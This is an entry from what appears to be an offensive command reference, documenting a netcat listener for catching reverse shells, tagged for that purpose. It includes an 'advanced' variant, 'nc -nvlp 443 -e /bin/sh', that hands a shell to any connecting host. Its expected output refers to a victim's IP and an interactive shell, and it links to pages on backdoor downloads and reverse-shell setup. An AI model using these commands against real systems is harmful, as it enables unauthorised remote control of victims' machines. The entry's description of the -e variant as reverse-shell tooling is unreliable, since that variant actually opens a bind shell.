---
data: nc -nvl 80
tags:
  - listener
  - reverse-shell
  - nc
type: command
output: null
executor: bash
platforms:
  - macOS
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.260Z'
id: cb829f16-f222-438d-9bcd-f93cf28c43f7
verified: false
validated: true
submitted: true
---
# nc-listener

## Command

```bash
nc -nvl 80
```

## Description

Sets up netcat as a TCP listener on port 80 without DNS lookups, ready to accept reverse shell connections and spawn an interactive shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-n` | No DNS resolution | Yes |
| `-v` | Verbose output | Yes |
| `-l` | Listen mode | Yes |
| `80` | Port to bind | Yes |

## Examples

### Basic Usage

```bash
nc -nvl 80
```

### Advanced Usage

```bash
nc -nvlp 443 -e /bin/sh
```

## Expected Output

'listening on [any] 80 ...' followed by connection details like 'connect to [victim_ip] from (victim_ip) [port]' and an interactive shell prompt upon callback.

## Related

- [[commands/curl-backdoor-download]]
- [[procedures/Set-Up-Reverse-Shell-Listener]]
